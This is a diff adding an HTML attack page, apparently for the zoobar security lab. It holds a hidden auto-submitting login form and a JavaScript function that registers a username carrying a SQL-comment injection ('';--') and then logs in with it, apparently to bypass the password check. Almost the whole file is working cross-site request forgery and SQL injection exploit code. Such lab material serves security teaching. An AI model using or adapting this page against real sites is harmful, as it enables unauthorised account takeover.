@@ -1,0 +1,28 @@
+<html>
+<body>
+<form action="http://zoobar.org/index.php" method="post" hidden>
+    <input type="hidden" name="login_username" value="username" id="login_username"/>
+    <input type="hidden" name="login_password" value="password" />
+    <input type="hidden" name="submit_login" value="Log+in" />
+
+    <button id="login">Send</button>
+</form>
+
+<input id="input_username">
+<button type="button" onclick="attack()">Attack</button>
+
+<script>
+  function attack() {
+    var username = document.getElementById('input_username').value
+    var xhr1 = new XMLHttpRequest();
+    xhr1.onloadstart = function () {
+      document.getElementById('login_username').value = username + "';--";
+      document.getElementById('login').click();
+    };
+    xhr1.open("POST", "http://zoobar.org/index.php", true);
+    xhr1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    xhr1.send("login_username=" + username + "%27%3B--&login_password=123&submit_registration=Register");
+  }
+</script>
+</body>
+</html>
